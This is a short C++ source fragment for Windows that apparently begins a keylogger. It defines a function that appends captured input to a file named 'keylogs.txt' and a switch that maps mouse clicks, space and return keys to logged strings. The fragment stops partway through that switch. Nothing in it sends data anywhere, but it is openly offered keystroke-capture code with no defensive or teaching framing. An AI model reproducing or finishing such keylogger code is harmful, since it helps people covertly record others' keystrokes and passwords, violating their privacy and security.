#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;

void Writelog(LPCSTR text){
    ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
    logfile.close();
}

bool Keylist(int iKey){
    switch(iKey){
        case VK_RBUTTON:
            cout << "rclick";
            Writelog(" rclick ");
			 break;
        case VK_LBUTTON:
            cout << "lclick";
            Writelog(" lclick ");
            break;
		case VK_SPACE:
            cout << " ";
            Writelog(" ");
            break;
		 case VK_RETURN:
            cout << "\n";
            Writelog("\n");
            break;